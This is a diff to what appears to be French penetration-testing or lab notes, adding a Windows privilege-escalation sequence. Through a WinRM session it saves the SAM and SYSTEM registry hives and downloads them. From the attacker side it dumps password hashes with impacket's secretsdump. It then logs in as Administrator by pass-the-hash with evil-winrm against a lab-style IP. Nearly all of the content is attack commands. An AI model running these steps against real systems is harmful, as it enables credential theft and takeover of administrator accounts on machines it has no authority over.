@@ -20,5 +20,13 @@ reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DW
 
 Avec un utilisateur qui a les privilèges [WinRM] <a href="https://github.com/fortra/impacket">Repo GitHub ici!</a>
 ```
-https://github.com/fortra/impacket.git
+reg save hklm\system system.bak
+reg save hklm\sam sam.bak
+download system.bak
+download sam.bak
+```
+[Attaquant]
+```
+python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
+evil-winrm -i 10.10.66.252 -u Administrator -H <theHash>
 ```
